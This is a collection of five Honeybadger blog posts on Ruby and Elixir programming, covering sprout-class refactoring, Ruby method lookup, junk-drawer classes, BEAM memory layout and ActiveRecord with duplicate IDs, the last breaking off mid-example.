{"website": "Honey-Badger", "title": "Refactoring Ruby using Sprout Classes", "author": ["Starr Horne"], "link": "https://www.honeybadger.io/blog/refactoring-ruby-with-the-sprout-class-pattern/", "abstract": "One of the hairiest challenges of working with some legacy applications is that the code wasn't written to be testable. So writing meaningful tests is difficult or impossible . It's a chicken-and-egg problem: in order to write tests for the legacy application, you have to change the code, but you can't confidently change the code without first writing tests for it! How do you deal with this paradox? This is one of the many subjects covered in Michael Feathers' excellent Working Effectively with Legacy Code . Today I'm going to zoom in on one particular technique from the book called Sprout Class . Get ready for some LEGACY CODE! Let's take a look at this old ActiveRecord class called Appointment . It's pretty long, and in real life it's 100's of lines longer. class Appointment < ActiveRecord::Base \n  has_many :appointment_services, :dependent => :destroy\n  has_many :services, :through => :appointment_services\n  has_many :appointment_products, :dependent => :destroy\n  has_many :products, :through => :appointment_products\n  has_many :payments, :dependent => :destroy\n  has_many :transaction_items\n  belongs_to :client\n  belongs_to :stylist\n  belongs_to :time_block_type\n\n  def record_transactions\n    transaction_items.destroy_all\n    if paid_for?\n      save_service_transaction_items\n      save_product_transaction_items\n      save_tip_transaction_item\n    end\n  end\n\n  def save_service_transaction_items\n    appointment_services.reload.each { |s| s.save_transaction_item(self.id) }\n  end\n\n  def save_product_transaction_items\n    appointment_products.reload.each { |p| p.save_transaction_item(self.id) }\n  end\n\n  def save_tip_transaction_item\n    TransactionItem.create!(\n      :appointment_id => self.id,\n      :stylist_id => self.stylist_id,\n      :label => \"Tip\",\n      :price => self.tip,\n      :transaction_item_type_id => TransactionItemType.find_or_create_by_code(\"TIP\").id\n    )\n  end\nend Adding some features If we're asked to add some new functionality to the transaction-reporting area, but the Appointment class has too many dependencies to be testable without a lot of refactoring, how do we proceed? One option is to just make the change: def record_transactions\n  transaction_items.destroy_all\n  if paid_for?\n    save_service_transaction_items\n    save_product_transaction_items\n    save_tip_transaction_item\n    send_thank_you_email_to_client # New code\n  end\nend\n\ndef send_thank_you_email_to_client\n  ThankYouMailer.thank_you_email(self).deliver\nend That kind of sucks There are two problems with the above code: Appointment has many different responsibilities (a violation of the Single Responsibility Principle ), one of these responsibilities being* recording transactions . By adding more transaction-related code to the Appointment class, **we're making the code a little bit worse *. we could maybe write a new integration test and check to see that the email made it across, but since we wouldn't have the Appointment class in a testable state, we couldn't add any unit tests. We'd be adding more untested code , which is of course bad. (Michael Feathers, in fact, defines legacy code as \"code without tests,\" so we'd be adding_more_ legacy code to the legacy code.) Chunking it up is better A better solution than simply adding the new code inline would be to extract the transaction-recording behavior into its own class. We'll call it, say, TransactionRecorder : class TransactionRecorder \n  def initialize(options)\n    @appointment_id       = options[:appointment_id]\n    @appointment_services = options[:appointment_services]\n    @appointment_products = options[:appointment_products]\n    @stylist_id           = options[:stylist_id]\n    @tip                  = options[:tip]\n  end\n\n  def run\n    save_service_transaction_items(@appointment_services)\n    save_product_transaction_items(@appointment_products)\n    save_tip_transaction_item(@appointment_id, @stylist_id, @tip_amount)\n  end\n\n  def save_service_transaction_items(appointment_services)\n    appointment_services.each { |s| s.save_transaction_item(appointment_id) }\n  end\n\n  def save_product_transaction_items(appointment_products)\n    appointment_products.each { |p| p.save_transaction_item(appointment_id) }\n  end\n\n  def save_tip_transaction_item(appointment_id, stylist_id, tip)\n    TransactionItem.create!(\n      appointment_id: appointment_id,\n      stylist_id: stylist_id,\n      label: \"Tip\",\n      price: tip,\n      transaction_item_type_id: TransactionItemType.find_or_create_by_code(\"TIP\").id\n    )  \n  end\nend The payoff Then Appointment can get pared down to just this: class Appointment < ActiveRecord::Base \n  has_many :appointment_services, :dependent => :destroy\n  has_many :services, :through => :appointment_services\n  has_many :appointment_products, :dependent => :destroy\n  has_many :products, :through => :appointment_products\n  has_many :payments, :dependent => :destroy\n  has_many :transaction_items\n  belongs_to :client\n  belongs_to :stylist\n  belongs_to :time_block_type\n\n  def record_transactions\n    transaction_items.destroy_all\n    if paid_for?\n      TransactionRecorder.new(\n        appointment_id: id,\n        appointment_services: appointment_services,\n        appointment_products: appointment_products,\n        stylist_id: stylist_id,\n        tip: tip\n      ).run\n    end\n  end\nend We're still modifying the code in Appointment , which can't be tested, but now we_can_ test everything in TransactionRecorder , and since we've changed each function to accept arguments rather than use instance variables, we can even test each function in isolation. So we're in a much better spot now than when we started.", "date": "2013-12-03"},
{"website": "Honey-Badger", "title": "Understanding Ruby Method Lookup", "author": ["Kingsley Silas"], "link": "https://www.honeybadger.io/blog/ruby-method-lookup/", "abstract": "What do you think happens when you call a method? How does Ruby decide which method to call when there’s another method with the same name? Have you ever wondered where the method is housed or sourced from? Ruby employs a defined \"way\" or \"pattern\" to determine the right method to call and the right time to return a “no method error”, and we can call this \"way\" the Ruby Method Lookup Path .\nIn this tutorial, we’ll be diving into Ruby’s method lookup. At the end, you’ll have a good understanding of how Ruby goes through the hierarchy of an object to determine which method you’re referring to. To fully grasp what we'll be learning, you'll need to have a basic understanding of Ruby. While we'll mention things like modules and classes, this will not be a deep dive into what they do. We'll only cover the depth needed to reach the goal of this tutorial: show you how Ruby determines the message (method) you're passing to an object. Overview When you call a method, such as first_person.valid? , Ruby has to determine a few things: Where the method .valid? is defined. Are there multiple places where the .valid? method is defined? If so, which is the right one to use in this context. The process (or path) Ruby follows in figuring this out is what we call method lookup . Ruby has to find where the method was created so that it can call it. It has to search in the following places to ensure it calls the right method: Singleton methods: Ruby provides a way for an object to define its own methods; these methods are only available to that object and cannot be accessed by an instance of the object. Methods in mixed-in modules: Modules can be mixed into a class using prepend , include , or extend . When this happens, the class has access to the methods defined in the modules, and Ruby goes into the modules to search for the method that has been called. It's also important to know that other modules can be mixed into the initial modules, and the search also progresses into these. Instance methods: These are methods defined in the class and accessible by instances of that class. Parent class methods or modules: If the class happens to be a child of another class, Ruby searches in the parent class. The search goes into the parent class singleton methods, mixed modules, and its parent class. Object, Kernel, and BasicObject: These are the last places where Ruby searches. This is because every object in Ruby has these as part of their ancestors. Classes and Modules Methods are often called on objects. These objects are created by certain classes, which could be Ruby's inbuilt classes or classes created by a developer. class Human attr_reader :name def initialize ( name ) @name = name end def hello put \"Hello! #{ name } \" end end We can then call the hello method that we have created above on instances of the Human class; for example, john = Human . new ( \"John\" ) john . hello # Output -> Hello John The hello method is an instance method; this is why we can call it on instances of the Human class. There might be cases where we do not want the method to be called on instances. In these cases, we want to call the method on the class itself. To achieve this, we'll have to create a class method. Defining a class method for the class we have above will look like this: def self . me puts \"I am a class method\" end We can then call this by doing Human.me . As the complexity of our application grows (imagine we're building a new start-up here), there might come a time when two or more of our classes have multiple methods that do the same thing. If this happens, it means we need to keep things dry and make sure that we do not repeat ourselves. The issue involves how we share functionality across these classes. If you have not used modules before, you might be tempted to create a new class strictly for these \"shared\" methods. However, doing so might result in negative consequences, especially when you need to utilize multiple inheritance, something that Ruby does not support. Modules are the best means of handling this case. Modules are similar to classes, but they have a few differences. First, here is an example of what a module looks like: module Movement def walk puts \"I can walk!\" end end Definition begins with the module keyword instead of class . Modules cannot have instances, so you cannot use Movement.new . Methods Methods can be viewed as actions to be performed by a particular object. If I have an array like [2, 3, 4] assigned to a variable called numberList , the .push method is an action that can be performed by the array to put the value it receives into the array. This code snippet is an example: john . walk It might be typical of you to say something like, \"I'm calling the object's method\", in which john references an object that is an instance of Human , and walk is the method. However, this isn't completely true because the inferred method tends to come from the object's class, superclass, or mixed-in module. It is important to add that it's possible to define a method on an object, even an object like john , because everything is an object in Ruby, even a class used in creating objects. def john . drip puts \"My drip is eternal\" end The drip method can only be accessible by the object assigned to john . drip is a singleton method that will be available to the john object. It is important to know that there's no difference between singleton methods and class methods, as you can see from this Stack Overflow answer . Unless you're referring to a method defined on an object like in the example above, it would be incorrect to say that the method belongs to a certain object. In our example, the walk method belongs to the Movement module, while the hello method belongs to the Human class. With this understanding, it will be easier to take this a step further, which is that to determine the exact method that is being called on an object, Ruby has to check the object's class or super class or modules that have been mixed in the object's hierarchy. Mixing Modules Ruby supports single inheritance only; a class can only inherit from one class. This makes it possible for the child class to inherit the behavior (methods) of another class. What happens when you have behaviors that need to be shared across different classes? For example, to make the walk method available to instances of the Human class, we can mix in the Movement module in the Human class. So, a rewrite of the Human class using include will look like this: require \"movement\" # Assuming we have the module in a file called movement.rb class Human include Movement attr_reader :name def initialize ( name ) @name = name end def hello put \"Hello! #{ name } \" end end Now, we can call the walk method on the instance: john = Human . new ( \"John\" ) john . walk Include When you make use of the include keyword, like we did above, the methods of the included module(s) get added to the class as instance method(s). This is because the included module is added among the ancestors of the Human class, such that the Movement module can be seen as a parent of the Human class. As you can see in the example we shown above, we've called the walk method on the instance of the Human class. Extend In addition to include , Ruby provides us with the extend keyword. This makes the method(s) of the module(s) available to the class as class method(s), which are also known as singleton methods, as we learned previously. So, if we have a module called Feeding that looks like module Feeding def food \"I make my food :)\" end end we can then share this behavior in our Human class by requiring it and adding extend Feeding . However, to use it, instead of calling the food method on the instance of the class, we'll call it on the class itself, the same way we call class methods. Human . food Prepend This is similar to include but with some differences, as stated in this post ; It actually works like include, except that instead of inserting the module between the class and its superclass in the chain, it will insert it at the bottom of the chain, even before the class itself. What it means is that when calling a method on a class instance, Ruby will look into the module methods before looking into the class. If we have a module that defines a hello method that we then mix into the Human class by using prepend , Ruby will call the method we have in the module instead of the one we have in the class. To properly understand how Ruby's prepend works, I suggest taking a look at this article . Method Lookup Path The first place the Ruby interpreter looks when trying to call a method is the singleton methods. I created this repl , which you can play with to see the possible results. Suppose we have a bunch of modules and classes that look like the following: module One def another puts \"From one module\" end end module Two def another puts \"From two module\" end end module Three def another puts \"From three module\" end end class Creature def another puts \"From creature class\" end end Let's go ahead to mix these into the Human class. class Human < Creature prepend Three extend Two include One def another puts \"Instance method\" end def self . another puts \"From Human class singleton\" end end Aside from mixing the modules, we have an instance and class method. You can also see that the Human class is a subclass of the Creature class. First Lookup - Singleton Methods When we run Human.another , what gets printed is From Human class singleton , which is what we have in the class method. If we comment out the class method and run it again, it will print From two module to the console. This comes from the module we mixed in using extend . It goes to show that the lookup begins among singleton methods. If we remove (or comment out) extend Two and run the command again, this will throw a method missing error . We get this error because Ruby could not find the another method among the singleton methods. We'll go ahead and make use of the class instance by creating an instance: n = Human . new We'll also create a singleton method for the instance: def n . another puts \"From n object\" end Now, when we run n.another , the version that gets called is the singleton method defined on the n object. The reason Ruby won't look call the module mixed in using extend in this case is because we're calling the method on the instance of the class. It is important to know that singleton methods have a higher relevance than methods involving modules mixed in using extend . Second Lookup - Modules Mixed In Using preprend If we comment out the singleton method on the n object and run the command, the version of the method that gets called is the module we mixed in using prepend . This is because the use of prepend inserts the module before the class itself. Third Lookup - The Class If we comment out the module Three , the version of the another method that gets called is the instance method defined on the class. Fourth Lookup - Modules Mixed In Using include The next place Ruby searches for the method is in modules that have been mixed in using include . So, when we comment out the instance method, the version we get is that which is in module One . Fifth Lookup - Parent Class If the class has a parent class, Ruby searches in the class. The search includes going into the modules mixed into the parent class; if we had the method defined in a module mixed into the Creature class, the method will get called. The End Of The Method Search We can know where the search of a method ends by checking its ancestors: calling .ancestors on the class. Doing this for the Human class will return [Three, Human, One, Creature, Object, Kernel, BasicObject] . The search for a method ends at the BasicObject class, which is Ruby's root class. Every object that is an instance of some class originated from the BasicObject class. After the method search goes past the developer-defined parent class, it gets to the following: the Object class the Kernel module the BasicObject class method_missing Method If you have been using Ruby for a while, you've probably come across NoMethodError , which happens when you attempt to an unknown method on an object. This happens after Ruby has gone through the ancestors of the object and could not find the called method. The error message you receive is handled by the method_missing method, defined in the BasicObject class. It is possible to override the method for the object you're calling the method on, which you can learn about by checking this . Conclusion Now you know the path Ruby takes in figuring out the method called on an object. With this understanding, you should be able to easily fix errors arising as a result of calling an unknown method on an object.", "date": "2021-05-24"},
{"website": "Honey-Badger", "title": "Avoiding Junk-Drawer Classes in Ruby", "author": ["Starr Horne"], "link": "https://www.honeybadger.io/blog/avoiding-junk-drawer-classes/", "abstract": "Because Ruby is an object-oriented language, we tend to model the world as a set of objects. We say that two integers (x and y) are a Point, and a Line has two of them. While this approach is often useful, it has one big problem. It privileges one interpretation of the data over all others. It assumes that x, and y will always be a Point and that you'll never need them to act as a Cell or Vector. What happens when you do need a Cell? Well, Point owns the data. So you add a your cell methods to Point. Over time you end up with a Point class that is a junk drawer of loosely-related methods. Junk-drawer classes are so common that we often accept them as inevitable and tack on a \"refactoring\" step to development. But what if we could avoid the problem in the first place? The first rule of web development is that we don't talk about the User class At the heart of any battle-hardened production Rails app is a gigantic monstrosity of a class called User . It always starts innocently enough. You want to let people log in. You need to store their username and password, so you create a class: class User attr_accessor :username , :password , :email , :address def authenticate! ( password ) ... end end That works so well that eventually people want to give you money. \"Ok,\" we say \"a User is basically the same thing as a Subscriber so we'll just add a few attributes and a few methods.\" class User ... attr_accessor :payment_processor_token , :subscription_plan_id , ... etc def charge_cc ... end end Great! Now we're making some real money! The CEO has decided that they want to be able to export VCards with users contact information so the sales team can easily import them into SalesForce. Time to fire up vim: class User ... def export_vcard ... end end What have we done? We started with a User class, whose only purpose was to handle authentication. By adding additional methods and attributes to it, we turned it into a User/Subscriber/Contact Frankenstein hybrid. Why would we do this? Do we not respect ourselves as developers? Did our parents not love us enough? Or did we set ourselves up for failure by believing that this data really is a thing, an object? Why do we say that the combo of username, password and email address is a User? Why not a Subscriber? Or a Contact? Or a SessionHolder? The truth about data is that it's data Data is just data. Today you may need to treat it like a boyfriend. Tomorrow it might be an ex-boyfriend. This is the approach that functional languages like Elixir take. Data is stored in simple structures much like Ruby's hashes, arrays, strings, etc. When you want to do something with the data you pass it in to a function. Any results are returned from that function. It sounds simple, but this approach makes it very easy to separate concerns into different modules. Here's a cartoon of how we might construct our User system it in Elixir: my_user = %{ username: \"foo\" , password: ... , phone: ... , payment_token: ... } my_user = Authentication . authenticate ( my_user ) my_user = Subscription . charge ( my_user ) my_user = Contact . export_vcard ( my_user ) Because data is separate from code, no module has a privileged interpretation of that data. Bringing it back to Ruby Since this approach works so well in Elixir, why not adopt it in Ruby? There's nothing stopping us from making User into a simple wrapper for its data, and pulling all business logic into modules. class User attr_accessor :username , :password , :email , :address end module Authentication def self . authenticate! ( user ) .. end end module Subscription def self . charge ( user ) .. end end module Contact def self . export_vcard ( user ) .. end end You could even make the User class into a struct, or add code to make it (kind-of) immutable. So what? Does this seem like a trivial change? What's the point? As we've seen, the typical OO approach has problems as it ages. By saying that a certain class owns data, we run into problems when we need to use that data in some other way. In the modular approach, however, adding behavior presents no problems. We simply create a new module that interprets the data in whatever way it needs to. It's easy to do so because data and functionality are completely separate. Other approaches There are other approaches to preventing the junk-drawer problem. Traditionally, in object-oriented programming you would attempt to do so via inheritance and careful refactoring. In 2012 Sandi Metz published Practical Object Oriented Design in Ruby which convinced many people to start composing objects using dependency injection. Even more recently, the popularity of functional programming has caused Rubyists to experiment with immutable \"data objects\". All of these approaches can be used to create clean, beautiful code. However the fact that classes typically own data means that there will always be tension between what the class is and what the class does with the data. I suspect that whatever success these approaches have in avoiding the junk-drawer problem results from their decoupling data from code.", "date": "2019-02-06"},
{"website": "Honey-Badger", "title": "How Elixir Lays Out Your Data in Memory", "author": ["Sasha Fonseca"], "link": "https://www.honeybadger.io/blog/elixir-memory-structure/", "abstract": "Higher-level languages hide the details to boost developer experience and productivity. However, this leads to a loss of understanding of the underlying system, preventing us from squeezing the highest level of efficiency and performance from our programs. Memory management is one of the aspects abstracted away from us in this trade-off. In this series, we'll take a look at how the BEAM VM works in this regard and learn to make better decisions when writing Elixir code. What is memory management Programs operate on top of values or a collection of values. These values are stored in memory so that they may be referred back to whenever needed to perform a particular operation. Understanding the underlying memory representation grants us the ability to adequately choose which data structures to use in a particular use-case. Doing it by hand Talking about memory management usually throws some programmers back to when they first learned C. This low-level language offers some functions, such as malloc and free , which, in turn, empower developers to seize and liberate memory at will: int *my_array;\nmy_array = (int *) malloc(sizeof(int) * 5);\nfree(my_array); However, eagle-eyed programmers (or those who have fallen into that trap before) may ask what happens if we don't call free when we no longer need the array? It leads us to a problem commonly known as a memory leak . Memory is like a jar of nails. When our program first starts, this jar is full and may be used at will. However, not putting the nails back into the jar when we no longer need them can eventually lead to not having enough nails to do our job. The memory in our system is our jar, and we ought to keep track of our nails or risk running out of them. This is the premise for a low-level language with manual memory management, such as C. Letting go of the training wheels For contrast, we can look at higher-level languages, such as Elixir, which take care of this matter for us: input = [1, 2, 3, 4, 5]\nmy_list = Enum.map(input, fn(x) -> x * 2 end) In the above example, we are able to map some input of unknown length into a list without having to allocate memory for my_list in any way whatsoever. In truth, it's difficult to give a direct counter-example to the C code shown previously since there really is no way of dealing with memory in Elixir.\nBut, if we can't free these variables from memory, doesn't it mean we'll cause a leak? Fortunately, this kind of language also takes care of this for us via a mechanism called garbage collection . Garbage collection in the BEAM world warrants an article on its own. , to keep it short, the VM knows to keep track of which variables will be used in the future and which ones can be deleted from memory. There are many different implementations for garbage collection across a variety of languages, each with its own benefits and drawbacks. Knowledge is power Even though Elixir handles memory allocation for us, it still has to be done, somehow, under the hood. Thus, understanding how this is performed and how BEAM data types are operated (e.g., created, read, and modified) and represented in memory can lead us to different choices in our programs. Our system's memory footprint and performance are affected by these decisions. Furthermore, having insight into the relationship between software and hardware rewards developers with better reasoning skills. These may come in handy when debugging weird errors or implementing mission-critical features. Information about Elixir's BEAM VM is scarce and can be convoluted and difficult to understand. Therefore, this article aims to present developers the fundamentals of memory management and aggregate all the scattered knowledge about this topic in one place. Memory word is the word A word is the fundamental data unit for a given computer architecture; thus, it varies from 4 bytes to 8 bytes for 32-bit and 64-bit systems, respectively. To discover the word size of a running system, you can use the :erlang.system_info(:wordsize) function. iex ( 1 ) > :erlang . system_info ( :wordsize ) 8 All data structures in Erlang are measured in this unit, and you can find the size of words using the :erts_debug.size/1 and :erts_debug.flat_size/1 functions. However, keep in mind that these are undocumented APIs and are not suited for production usage. Bite-sized bytes: literals and immediates The most basic memory containers in the BEAM world are immediates . These are types that fit into a single machine word. Immediates may be small integers large integers use bignum arithmetic for representation , local process identifiers (PIDs), ports, atoms, or a NIL value (which stands for the empty list and should not be confused with the atom nil ). Atoms Atoms are the most distinct of the immediates. They fill a special atom table and are never garbage-collected. This means once an atom is created, it will live in memory until the system exits. The first 6 bits of an atom are used to identify the value as an atom type. The remaining 26 bits represent the value itself. Thus, we are left with \\(2^6 = 32M\\) available slots in the atom table (for both 32-bit and 64-bit systems). When a given atom is created more than once, its memory footprint does not double. Instead of copying atoms, references are used to access the respective slot in the table . This can be seen when using the :erts_debug.size/1 function with an atom argument: iex ( 1 ) > :erts_debug . size ( :my_atom ) 0 The word size is zero because the atom itself lives in the atom table, and we are just passing references to that particular slot. A famous gotcha in the Erlang world is that exhausting the atom table crashes BEAM. Although the table has up to 32M slots, as we saw, it can be vulnerable to external attacks. Parsing external input to atoms can cause a long-running VM to crash. Therefore, it's considered a best practice to parse external input to strings whenever appropriate (for example, an HTTP endpoint's parameters). Boxed values Not all values fit into a single machine word. BEAM VM uses the concept of boxed values to accommodate larger values. These are made of a pointer that refers to three parcels: Header: 1 word to detail the type of boxed value. Arity: 26 bits, indicating the size of the following Erlang term. An array of words: the length is equal to the arity defined in the previous parcel. These words contain data for the data structure at hand. Boxed values encompass the data types not covered by immediates: lists, tuples, maps, binaries, remote PIDs and ports, floats, large integers, functions, and exports. In this article, we'll focus on the first four types. Lists In a BEAM VM, lists are implemented as single-linked lists and are comprised of cells. Each cell is split into two parts: The value of the particular list element. For example, the value of the first element of [1, 2, 3] is 1 . The tail, which points to the next element in the list. Each tail keeps pointing to the next element until the last tail points to the NIL value, which represents an empty list. In a sense, an Erlang list can be seen as a pair where the first part is the value of the list element, and the second part is another list. The next picture illustrates this concept for the list [1, 2, 3] : This choice of implementation is not without its benefits and trade-offs. Since it is a single-linked list, it can only be traversed forward. This is cumbersome when finding the length of a list because all the elements must be traversed. Thus, this operation is O(n) in Big-O Notation . However, this is advantageous when adding a new element to the head of a list - achieved by this syntax [1 | [2, 3, 4]] [^This is called consing , or the cons operator in the functional programming world]. Since the tail points to the remainder of a list, as in the previous example, the VM just needs to create a new cell with the value of 1 and a tail pointing to the existing list, [2, 3, 4] . Only a new head must be created in memory, and the rest of the list can be reused. This leaves us with O(1) constant time.\nIn contrast, appending lists ( [1, 2, 3] ++ [4, 5, 6] ) is O(N) , with N being the length of the first list. The VM must traverse its N elements to find the last one and point it to the second list instead of the NIL value. Similarly, the reverse operation (e.g., :lists.reverse/1 or Enum.reverse/1 ) is also O(N) . Again, BEAM just traverses the original list and copies each element to the head of the new list. Other operations, such as calculating the intersection between two lists ( [1, 2, 3] -- [4, 5, 6] ), incur harsher penalties when it comes to time complexity. In this operation, for each element on the first list, the second one must be traversed to check whether it exists and add it to a new list if this is the case. Therefore, we must consider a O(N) * O(M) complexity. In situations where the intersection of two lists must be calculated, employing another data structure, such as a Set, can result in better performance or memory efficiency. The last aspect to consider in lists is locality of reference in memory, especially spatially. In short, it's how close together each element of a list is in memory. When it comes to lists, their elements have a high likelihood of being contiguous when the list was built in a loop. This is beneficial and desirable since, most of the time, elements are to be accessed in succession. Tuples: fast access, slow modification Next in our discussion of the topic of boxed values is the concept of tuples, which is a type of data structure that allows a defined number of elements to be grouped together. However, unlike lists, tuples are implemented using an array underneath. The following picture illustrates how the tuple {\"May\", 42, :ok} is prefixed by its arity, followed by the array of elements. The memory used by a tuple can also be understood from the picture. The arity is stored in a single word, and each element of the array also occupies one word. Therefore, a tuple uses \\(1 + arity\\) words of memory. When it comes to nested tuples, this formula has to be applied to each one and summed. This is showcased in the next example, where the tuple {:error, {:reason, :failed}} has a nested tuple, which is just referred by a pointer in the parent tuple. iex ( 1 ) > child = { :reason , :failed } { :reason , :failed_to_start } iex ( 2 ) > parent = { :error , child } { :error , { :reason , :failed }} iex ( 3 ) > :erts_debug . size ( parent ) 6 Both the parent and child tuple have arity 2 (or 3 memory words each). After summing both, we get a total of 6 words, as returned by the :erts_debug.size/1 function. Choosing to use arrays grants tuples O(1) constant access time for both building and n-th element lookup. Nonetheless, modifying[^The word modifying, in this context, is used to imply creating the same tuple but with a different element at a given position. True modification is impossible since everything in a BEAM VM is immutable.] an element in a tuple is O(N) . Like everything in the Erlang world, the arrays used by tuples are immutable. The implications of such an implementation are that the tuple must be traversed and each element copied (except the altered element, which will be different). Memory locality for tuples can be trickier when compared to lists. Although the use of arrays grants contiguous memory blocks for tuple elements, they can become scattered when nested tuples (like the one depicted above) are not created simultaneously. Between tuples and lists are maps Maps provide a good middle-ground choice for those who are concerned about both lookup and update performance. Their implementation diverges based on the size of the map itself. Maps up to 31 keys rely on a sorted key-value list, and maps larger than that can be changed to use a hash-array mapped trie , a kind of associative array. This achieves O(log n) for insert and lookup operations, although two implementations are at hand. In a \"small map\" implementation, inserting and looking up involves applying a searching algorithm to find the correct position inside the sorted list. On a list of up to 31 elements, this takes 5 iterations at most with an algorithm like binary search . When it comes to \"large maps\", the data structure in place also provides the same time complexity for these operations. Keep this in mind when using maps in your programs, as one may be prone to believe this data structure yields O(1) time complexity for the mentioned operations, similar to hash maps provided by other languages. For most use-cases, the use of maps or tuples can be considered interchangeable. For example, rarely are more than 10 fields used when storing the state of a process (like a GenServer ). This means that either a tuple or a map can be used without any noticeable performance penalty. This is detailed by Steve Vinoski is a well-known Erlang expert and a co-author of the Designing for Scalability with Erlang/OTP book] in this post . Nonetheless, in performance-critical code, operations like element lookup (which, as we saw, are O(1) in tuples and O(log n) in maps) can make a difference, and it's up to the developer to choose the right data structure based on the system's needs. On such occasions, Erlang's records can come in quite handy, as they offer accessor functions similar to Elixir's struct but better performance in tight loops, as explained by José Valim himself. Binaries: to share or not to share Binary sequences are different since they may be shared between processes or be local to a given process. We can distinguish binaries as follows in the next few sections ^Erlang's Binary Handling guide can be a good supplemental reference for this topic. Heap binaries Usually abbreviated as HeapBin , the size of these binaries is under 64 bytes. They are stored in the local process' heap and are not shared with other processes. Thus, when they are sent in a message, the entire binary is copied to the receiving process.\nWhen a binary becomes stale, it's cleaned up by the process' garbage collection. Reference-counted binaries Reference-counted binaries are usually abbreviated as RefcBin . The size of these binaries is equal or larger than 64 bytes. They are stored in a dedicated and shared binary heap . Whenever a process uses a RefcBin , a corresponding process binary (or ProcBin ) is created in its heap. A ProcBin acts as a reference to the RefcBin . The binary heap keeps the total reference count for each of its binaries separately. The count for a given binary is incremented when a new reference is created or decremented once a reference becomes stale. This reference-counting mechanism offers the advantage of processes just passing the reference to each other instead of copying the entire binary when exchanging messages. However, these binaries are more prone to memory leaks, and garbage collection of these shared binaries is dependent on the liveness of their respective references. Only after all the references have become stale and cleaned up - by their own process's garbage collection - will the RefcBin be cleaned up. However, if just one of the processes holds on to the reference, the large binary will keep on living in memory. This may eventually lead to a binary leak As you may be aware, all data in BEAM are immutable. This prevents a large class of bugs around shared memory. As processes cannot access or modify each other's memory areas, problems like race conditions are eliminated. Nonetheless, this comes at the expense of having processes always copying data to each other - when communicating - instead of sharing. Since a BEAM VM is aimed at building low-latency and high-throughput I/O systems, which have to handle binaries with ease, the choice of sharing binaries larger than 64 bytes may have been a workaround to keep performance and efficiency up to par. Like always, engineering is a game of trade-offs. Sub binaries A sub binary object is a reference to a slice of either a HeapBin* or a _RefcBin* . These are created when matching a part of one of these binaries and exist in the process' heap. Match contexts Similar to the sub binary, match contexts are a reference optimized for matching slices of binaries. Match contexts are a compiler optimization and only happen when it knows a sub-binary will be discarded soon after its creation. This is best exemplified in Erlang's binary handling guide . Like sub-binaries, these also live in the local process' memory area. Conclusion In this article, we explained how each data type inside BEAM is allocated in memory. We also saw how the underlying implementation of these data structures can affect the common operations we rely on and how they may affect our programs. Keeping this information in mind (or in the form of a cheat-sheet) can boost our programs' performance or reduce their memory footprints. At the very least, we end up with a better understanding of how things work under the hood.", "date": "2021-03-01"},
{"website": "Honey-Badger", "title": "ActiveRecord For Databases Without Unique Ids", "author": ["Regan Ryan"], "link": "https://www.honeybadger.io/blog/activerecord-without-unique-id/", "abstract": "Sometimes unique situations and things out of our control lead to wildly unorthodox requirements. Recently, I had an experience where I needed to use ActiveRecord without relying on the database ID for any records. If anyone is considering doing the same, I highly recommend finding another way! But, let's move on to the rest of the story. Decisions were made. Smaller databases (clones in structure but not in data) needed to be merged. I joined the project just as the team was putting the finishing touches on a script that copies and pastes database records from one database to another. It copied everything exactly as-is, including IDs. Database A id fruit user_id ... ... ... 123 orange 456 ... ... ... Database B id fruit user_id ... ... ... 123 banana 74 ... ... ... Database A after merge id fruit user_id ... ... ... 123 orange 456 123 banana 74 ... ... ... This breaks the fundamental reason for having IDs: unique identification. I didn't know the specifics, but I felt like all kinds of problems would show up once duplicate IDs were introduced into the system. I tried to say something, but I was new to the project, and others seemed certain this was the best path forward. In a few days, we were going to deploy the code and start handling data with duplicate IDs. The question was no longer, \"should we do this?\"; instead, the questions were, \"how do we do this?\" and \"how much longer will this take?\" Working with duplicate IDs So, how do you handle data with duplicate IDs? The solution was to make a composite ID of several fields. Most of our DB fetches looked like this: # This doesn't work, there may be 2 users with id: 123 FavoriteFruit . find ( 123 ) # Multiple IDs scope the query to the correct record FavoriteFruit . find_by ( id: 123 , user_id: 456 ) All the ActiveRecord calls were updated in this way, and as I glanced through the code, it seemed to make sense. Until we deployed it. All hell breaks loose Shortly after we deployed the code, the phones started ringing. Customers were seeing numbers that didn't add up. They couldn't update their own records. All kinds of features were breaking. What should we do? We didn't just deploy code; we also moved data from one database to another (and new data were created/updated after we deployed). It was not a simple rollback situation. We needed to fix things fast. What is Rails doing? The first step in debugging was to see what the current behavior was and how to reproduce the error. I took a clone of the production data and started a Rails console. Depending on your setup, you may not automatically see the SQL queries Rails runs when you execute an ActiveRecord query. Here's how to ensure SQL statements are visible on your console: ActiveRecord :: Base . logger = Logger . new ( STDOUT ) After that, I tried some common Rails queries: $ FavoriteFruit . find_by ( id: 123 , user_id: 456 ) FavoriteFruit Load ( 0.6 ms ) SELECT \"favorite_fruits\" . * FROM \"favorite_fruits\" WHERE \"favorite_fruits\" . \"id\" = $1 AND \"favorite_fruits\" . \"user_id\" = $2 [[ \"id\" , \"123\" ], [ \"user_id\" , \"456\" ]] find_by seemed to work fine, but then I saw some code like this: fruit = FavoriteFruit . find_by ( id: 123 , user_id: 456 ) ... ... fruit . reload That reload made me curious, so I tested that too: $ fruit . reload FavoriteFruit Load ( 0.3 ms ) SELECT \"favorite_fruits\" . * FROM \"favorite_fruits\" WHERE \"favorite_fruits\" . \"id\" = $1 LIMIT $2 [[ \"id\" , 123 ], [ \"LIMIT\" , 1 ]] Uh oh. So, even though we initially fetched the correct record with find_by , whenever we called reload , it would take the ID of the record and do a simple find-by-id query, which, of course, would often give incorrect data due to our duplicate IDs. Why did it do that? I examined the Rails source code for clues. This is a great aspect of coding with Ruby on Rails, the source code is plain Ruby and freely available to access. I simply googled \"ActiveRecord reload\" and quickly found this: # File activerecord/lib/active_record/persistence.rb, line 602 def reload ( options = nil ) self . class . connection . clear_query_cache fresh_object = if options && options [ :lock ] self . class . unscoped { self . class . lock ( options [ :lock ]). find ( id ) } else self . class . unscoped { self . class . find ( id ) } end @attributes = fresh_object . instance_variable_get ( \"@attributes\" ) @new_record = false self end This shows that reload is, more or less, a wrapper for self.class.find(id) . Querying only by an ID was hardwired into this method. For us to work with duplicate IDs, we'd need to either override core Rails methods (never recommended) or stop using reload altogether. Our Solution So, we decided to go through every reload in the code and change it to find_by to get the database fetching via multiple keys. However, that was only some of the bugs resolved. After more digging, I decided to test our update calls: $ fruit = FavoriteFruit . find_by ( id: 123 , user_id: 456 ) $ fruit . update ( last_eaten: Time . now ) FavoriteFruit Update ( 43.3 ms ) UPDATE \"favorite_fruits\" SET \"last_eaten\" = $1 WHERE 